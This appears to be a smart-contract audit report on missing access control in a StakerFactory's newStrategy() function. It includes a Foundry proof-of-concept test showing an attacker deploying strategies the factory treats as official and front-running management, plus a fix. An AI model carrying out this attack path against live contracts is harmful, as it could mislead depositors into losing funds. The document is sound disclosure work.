# Missing Access Control in StakerFactory Allows Unauthorized Strategy Deployment

### Summary

The missing `onlyManagement` modifier in `StakerFactory.newStrategy()` will cause unauthorized strategy deployment for any user as anyone can create malicious or unintended staker strategies that may confuse users or disrupt the ecosystem.

### Root Cause

In [`StakerFactory.sol:newStrategy()`](https://github.com/johnnyonline/yv3-liquityv2-sp-strategy/blob/99bdf0a9ade3af6f68e7d6b008b3c5a379e94f16/src/StakerFactory.sol#L32-L48) at lines 32-48, the function lacks the `onlyManagement` modifier that is correctly implemented in `StrategyFactory.sol`:

**Vulnerable Code (StakerFactory.sol):**

```solidity
function newStrategy(address _asset, string calldata _name) external virtual returns (address) {
    // Missing onlyManagement modifier - ANYONE can call this
    IStrategyInterface _newStrategy = IStrategyInterface(address(new Strategy(_asset, _name)));
    // ... rest of deployment logic
}
```

**Correct Implementation (StrategyFactory.sol):**

```solidity
function newStrategy(
    address _addressesRegistry,
    address _asset, 
    string calldata _name
) external virtual onlyManagement returns (address) {
    // Properly protected with onlyManagement
}
```

### Internal Pre-conditions

1.  StakerFactory needs to be deployed and accessible
2.  Attacker needs to know a valid `_asset` address (e.g., yBOLD vault address)
3.  Attacker needs to provide any `_name` string for the strategy

### External Pre-conditions

1.  No external conditions required - this is a permissionless vulnerability
2.  Network needs to be operational for transaction execution

### Attack Path

1.  **Attacker identifies StakerFactory contract** - Contract address is publicly available
2.  **Attacker calls `newStrategy()` directly** - No permission checks prevent this
3.  **Malicious strategy gets deployed** - Factory deploys strategy with attacker's chosen parameters
4.  **Strategy gets registered in deployments mapping** - `deployments[_asset] = address(_newStrategy)`
5.  **Legitimate factory calls may fail** - If management tries to deploy official strategy for same asset
6.  **Users may interact with wrong strategy** - `isDeployedStrategy()` will return true for malicious strategy
7.  **Ecosystem confusion and potential losses** - Users deposit into unauthorized strategies

### Impact

**Users suffer potential fund loss and ecosystem disruption as unauthorized strategies can be deployed with official factory endorsement, leading to confusion about which strategies are legitimate.**

Specific impacts:
-   Unauthorized strategies appear "official" due to factory deployment
-   `isDeployedStrategy()` returns true for malicious strategies
-   Prevents legitimate management from deploying official strategies for affected assets
-   Users may unknowingly interact with malicious or untested strategies
-   Undermines trust in the factory system's security model

### PoC


**Key Evidence:**

-   `StakerFactory.newStrategy()` has no access control modifier
-   `StrategyFactory.newStrategy()` correctly uses `onlyManagement`
-   Malicious strategies get registered in `deployments` mapping
-   `isDeployedStrategy()` returns true for unauthorized deployments

```solidity
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../StakerFactory.sol";
import "../Staker.sol";

contract FactoryAccessControlTest is Test {
    StakerFactory public factory;
    address public management = address(0x1);
    address public attacker = address(0x666);
    address public fakeAsset = address(0x123);

    function setUp() public {
        // Mock decimals() and accountant() calls
        vm.mockCall(
            fakeAsset,
            abi.encodeWithSignature("decimals()"),
            abi.encode(uint8(18))
        );
        vm.mockCall(
            fakeAsset,
            abi.encodeWithSignature("accountant()"),
            abi.encode(address(0xACC))
        );

        factory = new StakerFactory(
            management, // management
            address(0x2), // performanceFeeRecipient
            address(0x3), // keeper
            address(0x4) // emergencyAdmin
        );
    }

    function test_unauthorizedStrategyDeployment() public {
        // Verify attacker is not management
        assertFalse(attacker == management);

        // Attacker can deploy strategy without permission
        vm.prank(attacker);
        address maliciousStrategy = factory.newStrategy(
            fakeAsset,
            "Malicious Strategy"
        );

        // Strategy was successfully deployed
        assertTrue(maliciousStrategy != address(0));

        // Factory recognizes it as legitimate
        assertTrue(factory.isDeployedStrategy(maliciousStrategy));

        // Strategy is registered in deployments mapping
        assertEq(factory.deployments(fakeAsset), maliciousStrategy);

        console.log(
            "Attacker successfully deployed strategy at:",
            maliciousStrategy
        );
    }

    function test_raceConditionVulnerability() public {
        // Scenario: Attacker front-runs management deployment
        
        // 1. Attacker sees management transaction in mempool
        // 2. Attacker deploys malicious strategy with higher gas price
        vm.prank(attacker);
        address maliciousStrategy = factory.newStrategy(
            fakeAsset,
            "Fake Official Strategy" // Deceptive name
        );

        // 3. Users may interact with malicious strategy thinking it's official
        assertTrue(factory.isDeployedStrategy(maliciousStrategy));
        
        // 4. Later, management's transaction executes and overwrites
        vm.prank(management);  
        address legitimateStrategy = factory.newStrategy(
            fakeAsset,
            "Real Official Strategy"
        );

        // 5. Now the legitimate strategy is official
        assertEq(factory.deployments(fakeAsset), legitimateStrategy);
        assertTrue(factory.isDeployedStrategy(legitimateStrategy));
        assertFalse(factory.isDeployedStrategy(maliciousStrategy));

        // 6. But users who interacted with malicious strategy are affected
        console.log("Malicious strategy (no longer official):", maliciousStrategy);
        console.log("Legitimate strategy (now official):", legitimateStrategy);
    }
    
    function test_multipleAssetConfusion() public {
        address asset1 = address(0x111);
        address asset2 = address(0x222);
        
        // Mock both assets
        vm.mockCall(asset1, abi.encodeWithSignature("decimals()"), abi.encode(uint8(18)));
        vm.mockCall(asset1, abi.encodeWithSignature("accountant()"), abi.encode(address(0xACC1)));
        vm.mockCall(asset2, abi.encodeWithSignature("decimals()"), abi.encode(uint8(18)));
        vm.mockCall(asset2, abi.encodeWithSignature("accountant()"), abi.encode(address(0xACC2)));

        // Attacker can deploy strategies for multiple assets
        vm.startPrank(attacker);
        address malicious1 = factory.newStrategy(asset1, "Fake Strategy 1");
        address malicious2 = factory.newStrategy(asset2, "Fake Strategy 2");
        vm.stopPrank();

        // Both appear legitimate until management overwrites them
        assertTrue(factory.isDeployedStrategy(malicious1));
        assertTrue(factory.isDeployedStrategy(malicious2));
        
        console.log("Attacker deployed multiple fake strategies");
    }

    function test_contrastWithStrategyFactory() public {
        // This demonstrates the inconsistency in access control between factories
        
        // StakerFactory allows anyone to deploy (vulnerability)
        vm.prank(attacker);
        address unauthorizedStaker = factory.newStrategy(
            fakeAsset,
            "Unauthorized Staker"
        );
        assertTrue(unauthorizedStaker != address(0)); // Attack succeeds
        
        // StrategyFactory would prevent this with onlyManagement modifier
        // vm.prank(attacker);  
        // vm.expectRevert("!management");
        // strategyFactory.newStrategy(registry, asset, name);
    }
}
```

### Mitigation

**Add the missing access control modifier:**

```solidity
function newStrategy(address _asset, string calldata _name) external virtual onlyManagement returns (address) {
    // Now properly restricted to management only
    IStrategyInterface _newStrategy = IStrategyInterface(address(new Strategy(_asset, _name)));
    
    _newStrategy.setPerformanceFeeRecipient(performanceFeeRecipient);
    _newStrategy.setKeeper(keeper);
    _newStrategy.setPendingManagement(management);
    _newStrategy.setEmergencyAdmin(emergencyAdmin);

    emit NewStrategy(address(_newStrategy), _asset);

    deployments[_asset] = address(_newStrategy);
    return address(_newStrategy);
}

```

**Additional security improvement:**

```solidity
// Also add the modifier declaration if missing
modifier onlyManagement() {
    require(msg.sender == management, "!management");
    _;
}

```

This brings `StakerFactory` in line with the security model used in `StrategyFactory` and prevents unauthorized strategy deployments.
